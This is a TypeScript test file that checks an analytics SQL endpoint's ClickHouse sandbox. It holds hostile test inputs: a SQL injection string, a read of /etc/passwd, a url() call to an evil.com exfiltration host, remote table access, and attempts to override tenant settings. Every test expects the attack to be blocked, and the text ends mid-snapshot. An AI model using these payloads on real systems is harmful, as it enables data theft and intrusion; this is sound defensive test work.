import { wait } from "@stackframe/stack-shared/dist/utils/promises";
import { deindent } from "@stackframe/stack-shared/dist/utils/strings";
import { it } from "../../../../helpers";
import { Project, niceBackendFetch } from "../../../backend-helpers";

async function runQuery(body: { query: string, params?: Record<string, string>, timeout_ms?: number }) {
  await Project.createAndSwitch({ config: { magic_link_enabled: true } });

  const response = await niceBackendFetch("/api/v1/internal/analytics/query", {
    method: "POST",
    accessType: "admin",
    body,
  });

  return response;
}

type ExpectLike = ((value: unknown) => { toEqual: (value: unknown) => void }) & {
  any: (constructor: unknown) => unknown,
};

const stripQueryId = <T extends { status: number, body?: Record<string, unknown> | null }>(response: T, expect: ExpectLike) => {
  if (response.status === 200 && response.body) {
    expect(response.body.query_id).toEqual(expect.any(String));
    delete response.body.query_id;
  }
  return response;
};

async function fetchQueryTiming(queryId: string) {
  return await niceBackendFetch("/api/v1/internal/analytics/query/timing", {
    method: "POST",
    accessType: "server",
    body: {
      query_id: queryId,
    },
  });
}

async function fetchQueryTimingWithRetry(queryId: string, attempts = 5, delayMs = 200) {
  let response = await fetchQueryTiming(queryId);
  for (let attempt = 0; attempt < attempts; attempt += 1) {
    if (response.status === 200) {
      break;
    }
    await wait(delayMs);
    response = await fetchQueryTiming(queryId);
  }
  return response;
}

it("can execute a basic query with admin access", async ({ expect }) => {
  const response = await runQuery({ query: "SELECT 1 as value" });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": { "result": [{ "value": 1 }] },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("returns a query_id for analytics queries", async ({ expect }) => {
  const response = await runQuery({ query: "SELECT 1 as value" });

  expect(response.status).toBe(200);
  expect(response.body?.query_id).toEqual(expect.any(String));
});

it("can fetch query timing by query_id", async ({ expect }) => {
  const response = await runQuery({ query: "SELECT 1 as value" });
  const queryId = response.body?.query_id;

  expect(response.status).toBe(200);
  expect(queryId).toEqual(expect.any(String));
  if (typeof queryId !== "string") {
    throw new Error("Expected analytics query response to include query_id.");
  }

  const timingResponse = await fetchQueryTimingWithRetry(queryId);
  expect(timingResponse).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": {
        "stats": {
          "cpu_time": <stripped field 'cpu_time'>,
          "wall_clock_time": <stripped field 'wall_clock_time'>,
        },
      },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("does not allow fetching timing for another project's query", async ({ expect }) => {
  await Project.createAndSwitch({ config: { magic_link_enabled: true } });
  const projectAQuery = await runQuery({ query: "SELECT 1 as value" });
  const projectAQueryId = projectAQuery.body?.query_id;
  expect(projectAQuery.status).toBe(200);
  expect(projectAQueryId).toEqual(expect.any(String));
  if (typeof projectAQueryId !== "string") {
    throw new Error("Expected analytics query response to include query_id.");
  }

  await Project.createAndSwitch({ config: { magic_link_enabled: true } });
  const response = await fetchQueryTiming(projectAQueryId);

  expect(response).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 404,
      "body": {
        "code": "ITEM_NOT_FOUND",
        "details": { "item_id": "<stripped UUID>:main:<stripped UUID>" },
        "error": "Item with ID \\"<stripped UUID>:main:<stripped UUID>\\" not found.",
      },
      "headers": Headers {
        "x-stack-known-error": "ITEM_NOT_FOUND",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("can execute a query with parameters", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT {test_param:String} as value",
    params: {
      test_param: "hello world",
    },
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": { "result": [{ "value": "hello world" }] },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("can execute a query with custom timeout", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT 1 as value",
    timeout_ms: 15000,
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": { "result": [{ "value": 1 }] },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("rejects timeouts longer than 2 minutes", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT 1 as value",
    timeout_ms: 120_001,
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "SCHEMA_ERROR",
        "details": {
          "message": deindent\`
            Request validation failed on POST /api/v1/internal/analytics/query:
              - body.timeout_ms must be less than or equal to 120000
          \`,
        },
        "error": deindent\`
          Request validation failed on POST /api/v1/internal/analytics/query:
            - body.timeout_ms must be less than or equal to 120000
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "SCHEMA_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("validates required query field", async ({ expect }) => {
  const response = await runQuery({} as any);

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "SCHEMA_ERROR",
        "details": {
          "message": deindent\`
            Request validation failed on POST /api/v1/internal/analytics/query:
              - body.query must be defined
          \`,
        },
        "error": deindent\`
          Request validation failed on POST /api/v1/internal/analytics/query:
            - body.query must be defined
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "SCHEMA_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("handles invalid SQL query", async ({ expect }) => {
  const response = await runQuery({ query: "INVALID SQL QUERY" });

  expect(response.status).toBe(400);
  expect(response.body).toMatchInlineSnapshot(`
    {
      "code": "ANALYTICS_QUERY_ERROR",
      "details": {
        "error": deindent\`
          Syntax error: failed at position 1 (INVALID) (line 1, col 1): INVALID SQL QUERY 
          FORMAT JSONEachRow. Expected one of: Query, Query with output, EXPLAIN, EXPLAIN, SELECT query, possibly with UNION, list of union elements, SELECT query, subquery, possibly with UNION, SELECT subquery, SELECT query, WITH, FROM, SELECT, SHOW CREATE QUOTA query, SHOW CREATE, SHOW [FULL] [TEMPORARY] TABLES|DATABASES|CLUSTERS|CLUSTER|MERGES 'name' [[NOT] [I]LIKE 'str'] [LIMIT expr], SHOW, SHOW COLUMNS query, SHOW ENGINES query, SHOW ENGINES, SHOW FUNCTIONS query, SHOW FUNCTIONS, SHOW INDEXES query, SHOW SETTING query, SHOW SETTING, EXISTS or SHOW CREATE query, EXISTS, DESCRIBE FILESYSTEM CACHE query, DESCRIBE, DESC, DESCRIBE query, SHOW PROCESSLIST query, SHOW PROCESSLIST, CREATE TABLE or ATTACH TABLE query, CREATE, ATTACH, REPLACE, CREATE DATABASE query, CREATE VIEW query, CREATE DICTIONARY, CREATE LIVE VIEW query, CREATE WINDOW VIEW query, ALTER query, ALTER TABLE, ALTER TEMPORARY TABLE, ALTER DATABASE, RENAME query, RENAME DATABASE, RENAME TABLE, EXCHANGE TABLES, RENAME DICTIONARY, EXCHANGE DICTIONARIES, RENAME, DROP query, DROP, DETACH, TRUNCATE, UNDROP query, UNDROP, CHECK ALL TABLES, CHECK TABLE, KILL QUERY query, KILL, OPTIMIZE query, OPTIMIZE TABLE, WATCH query, WATCH, SHOW ACCESS query, SHOW ACCESS, ShowAccessEntitiesQuery, SHOW GRANTS query, SHOW GRANTS, SHOW PRIVILEGES query, SHOW PRIVILEGES, BACKUP or RESTORE query, BACKUP, RESTORE, INSERT query, INSERT INTO, USE query, USE, SET ROLE or SET DEFAULT ROLE query, SET ROLE DEFAULT, SET ROLE, SET DEFAULT ROLE, SET query, SET, SYSTEM query, SYSTEM, CREATE USER or ALTER USER query, ALTER USER, CREATE USER, CREATE ROLE or ALTER ROLE query, ALTER ROLE, CREATE ROLE, CREATE QUOTA or ALTER QUOTA query, ALTER QUOTA, CREATE QUOTA, CREATE ROW POLICY or ALTER ROW POLICY query, ALTER POLICY, ALTER ROW POLICY, CREATE POLICY, CREATE ROW POLICY, CREATE SETTINGS PROFILE or ALTER SETTINGS PROFILE query, ALTER SETTINGS PROFILE, ALTER PROFILE, CREATE SETTINGS PROFILE, CREATE PROFILE, CREATE FUNCTION query, DROP FUNCTION query, CREATE WORKLOAD query, DROP WORKLOAD query, CREATE RESOURCE query, DROP RESOURCE query, CREATE NAMED COLLECTION, DROP NAMED COLLECTION query, Alter NAMED COLLECTION query, ALTER, CREATE INDEX query, DROP INDEX query, DROP access entity query, MOVE access entity query, MOVE, GRANT or REVOKE query, REVOKE, GRANT, CHECK GRANT, CHECK GRANT, TCL query, BEGIN TRANSACTION, START TRANSACTION, COMMIT, ROLLBACK, SET TRANSACTION SNAPSHOT, Delete query, DELETE, Update query, UPDATE, COPY query, COPY. 
        \`,
      },
      "error": deindent\`
        Syntax error: failed at position 1 (INVALID) (line 1, col 1): INVALID SQL QUERY 
        FORMAT JSONEachRow. Expected one of: Query, Query with output, EXPLAIN, EXPLAIN, SELECT query, possibly with UNION, list of union elements, SELECT query, subquery, possibly with UNION, SELECT subquery, SELECT query, WITH, FROM, SELECT, SHOW CREATE QUOTA query, SHOW CREATE, SHOW [FULL] [TEMPORARY] TABLES|DATABASES|CLUSTERS|CLUSTER|MERGES 'name' [[NOT] [I]LIKE 'str'] [LIMIT expr], SHOW, SHOW COLUMNS query, SHOW ENGINES query, SHOW ENGINES, SHOW FUNCTIONS query, SHOW FUNCTIONS, SHOW INDEXES query, SHOW SETTING query, SHOW SETTING, EXISTS or SHOW CREATE query, EXISTS, DESCRIBE FILESYSTEM CACHE query, DESCRIBE, DESC, DESCRIBE query, SHOW PROCESSLIST query, SHOW PROCESSLIST, CREATE TABLE or ATTACH TABLE query, CREATE, ATTACH, REPLACE, CREATE DATABASE query, CREATE VIEW query, CREATE DICTIONARY, CREATE LIVE VIEW query, CREATE WINDOW VIEW query, ALTER query, ALTER TABLE, ALTER TEMPORARY TABLE, ALTER DATABASE, RENAME query, RENAME DATABASE, RENAME TABLE, EXCHANGE TABLES, RENAME DICTIONARY, EXCHANGE DICTIONARIES, RENAME, DROP query, DROP, DETACH, TRUNCATE, UNDROP query, UNDROP, CHECK ALL TABLES, CHECK TABLE, KILL QUERY query, KILL, OPTIMIZE query, OPTIMIZE TABLE, WATCH query, WATCH, SHOW ACCESS query, SHOW ACCESS, ShowAccessEntitiesQuery, SHOW GRANTS query, SHOW GRANTS, SHOW PRIVILEGES query, SHOW PRIVILEGES, BACKUP or RESTORE query, BACKUP, RESTORE, INSERT query, INSERT INTO, USE query, USE, SET ROLE or SET DEFAULT ROLE query, SET ROLE DEFAULT, SET ROLE, SET DEFAULT ROLE, SET query, SET, SYSTEM query, SYSTEM, CREATE USER or ALTER USER query, ALTER USER, CREATE USER, CREATE ROLE or ALTER ROLE query, ALTER ROLE, CREATE ROLE, CREATE QUOTA or ALTER QUOTA query, ALTER QUOTA, CREATE QUOTA, CREATE ROW POLICY or ALTER ROW POLICY query, ALTER POLICY, ALTER ROW POLICY, CREATE POLICY, CREATE ROW POLICY, CREATE SETTINGS PROFILE or ALTER SETTINGS PROFILE query, ALTER SETTINGS PROFILE, ALTER PROFILE, CREATE SETTINGS PROFILE, CREATE PROFILE, CREATE FUNCTION query, DROP FUNCTION query, CREATE WORKLOAD query, DROP WORKLOAD query, CREATE RESOURCE query, DROP RESOURCE query, CREATE NAMED COLLECTION, DROP NAMED COLLECTION query, Alter NAMED COLLECTION query, ALTER, CREATE INDEX query, DROP INDEX query, DROP access entity query, MOVE access entity query, MOVE, GRANT or REVOKE query, REVOKE, GRANT, CHECK GRANT, CHECK GRANT, TCL query, BEGIN TRANSACTION, START TRANSACTION, COMMIT, ROLLBACK, SET TRANSACTION SNAPSHOT, Delete query, DELETE, Update query, UPDATE, COPY query, COPY. 
      \`,
    }
  `);
});

it("can execute query returning multiple rows", async ({ expect }) => {
  const response = await runQuery({ query: "SELECT arrayJoin([0, 1, 2]) AS number" });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": {
        "result": [
          { "number": 0 },
          { "number": 1 },
          { "number": 2 },
        ],
      },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("can execute query with multiple parameters", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT {param1:String} as col1, {param2:String} as col2",
    params: {
      param1: "value1",
      param2: "value2",
    },
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": {
        "result": [
          {
            "col1": "value1",
            "col2": "value2",
          },
        ],
      },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("can execute query and hit custom timeout", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT sleep(3)",
    timeout_ms: 1000,
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "Timeout exceeded: elapsed <stripped time> ms, maximum: 1000 ms. " },
        "error": "Timeout exceeded: elapsed <stripped time> ms, maximum: 1000 ms. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("sets SQL_project_id and SQL_branch_id settings in query", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT getSetting('SQL_project_id') AS project_id, getSetting('SQL_branch_id') AS branch_id;",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": {
        "result": [
          {
            "branch_id": "main",
            "project_id": "<stripped UUID>",
          },
        ],
      },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});


it("does not allow CREATE TABLE", async ({ expect }) => {
  const response = await runQuery({
    query: "CREATE TABLE IF NOT EXISTS test_table (id UUID) ENGINE = MergeTree() ORDER BY id;",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE TABLE ON default.test_table. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE TABLE ON default.test_table. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});


it("does not allow querying system tables", async ({ expect }) => {
  const response = await runQuery({ query: "SELECT number FROM system.numbers LIMIT 1" });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(number) ON system.numbers. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(number) ON system.numbers. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});


it("does not allow killing queries", async ({ expect }) => {
  const response = await runQuery({
    query: "KILL QUERY WHERE query_id = '00000000-0000-0000-0000-000000000000'",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(query_id, user, query) ON system.processes. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(query_id, user, query) ON system.processes. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});


it("does not allow INSERT statements", async ({ expect }) => {
  const response = await runQuery({ query: "INSERT INTO system.one (dummy) VALUES (0)" });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant INSERT(dummy) ON system.one. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant INSERT(dummy) ON system.one. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});


it("does not allow updating ClickHouse settings", async ({ expect }) => {
  const response = await runQuery({
    query: deindent`
      SELECT *
      FROM events
      SETTINGS max_memory_usage = 10000000000;
    `,
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "Cannot modify 'max_memory_usage' setting in readonly mode. " },
        "error": "Cannot modify 'max_memory_usage' setting in readonly mode. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("has a restricted user and roles", async ({ expect }) => {
  const response = await runQuery({
    query: deindent`
      SELECT
        currentUser()  AS user,
        currentRoles() AS assigned_roles;
    `,
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": {
        "result": [
          {
            "assigned_roles": [],
            "user": "limited_user",
          },
        ],
      },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("has limited grants", async ({ expect }) => {
  const response = await runQuery({
    query: "SHOW GRANTS WITH IMPLICIT FINAL",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": {
        "result": [
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT TABLE ENGINE ON * TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON AzureBlobStorage FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON Distributed FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON File FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON HDFS FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON Hive FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON JDBC FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON Kafka FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON MongoDB FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON MySQL FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON NATS FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON ODBC FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON PostgreSQL FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON RabbitMQ FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON Redis FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON S3 FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON SQLite FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "REVOKE TABLE ENGINE ON URL FROM limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SHOW DATABASES ON default.* TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SHOW TABLES, SHOW COLUMNS, SELECT ON default.events TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.aggregate_function_combinators TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.collations TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.columns TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.contributors TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.current_roles TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.data_type_families TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.database_engines TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.databases TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.enabled_roles TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.formats TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.functions TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.licenses TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.one TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.privileges TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.quota_usage TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.settings TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.table_engines TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.table_functions TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.tables TO limited_user" },
          { "GRANTS WITH IMPLICIT FINAL FORMAT JSONEachRow": "GRANT SELECT ON system.time_zones TO limited_user" },
        ],
      },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("can see only some tables", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT database, name FROM system.tables",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": {
        "result": [
          {
            "database": "default",
            "name": "events",
          },
        ],
      },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("SHOW TABLES should have the correct tables", async ({ expect }) => {
  const response = await runQuery({
    query: "SHOW TABLES",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": { "result": [{ "name": "events" }] },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("can read the current database", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT currentDatabase()",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": { "result": [{ "currentDatabase()": "default" }] },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("does not allow SQL injection via parameters", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT {injected:String} as value",
    params: { injected: "'; DROP TABLE events; --" },
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": { "result": [{ "value": "'; DROP TABLE events; --" }] },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("does not allow overriding SQL_project_id setting", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM events SETTINGS SQL_project_id = 'other-project-id'",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "Cannot modify 'SQL_project_id' setting in readonly mode. " },
        "error": "Cannot modify 'SQL_project_id' setting in readonly mode. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow overriding SQL_branch_id setting", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM events SETTINGS SQL_branch_id = 'other-branch-id'",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "Cannot modify 'SQL_branch_id' setting in readonly mode. " },
        "error": "Cannot modify 'SQL_branch_id' setting in readonly mode. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow accessing system tables via subquery", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM events WHERE 1 = (SELECT count() FROM system.users)",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT for at least one column on system.users. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT for at least one column on system.users. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow UNION to access restricted data", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT 1 as value UNION ALL SELECT number FROM system.numbers LIMIT 1",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(number) ON system.numbers. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(number) ON system.numbers. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow file system access via file() function", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM file('/etc/passwd', 'CSV', 'line String')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON FILE. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON FILE. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow network access via url() function", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM url('http://evil.com/exfiltrate', 'CSV', 'data String')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON URL. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON URL. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow remote table access", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM remote('localhost', system, users)",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON REMOTE. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON REMOTE. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
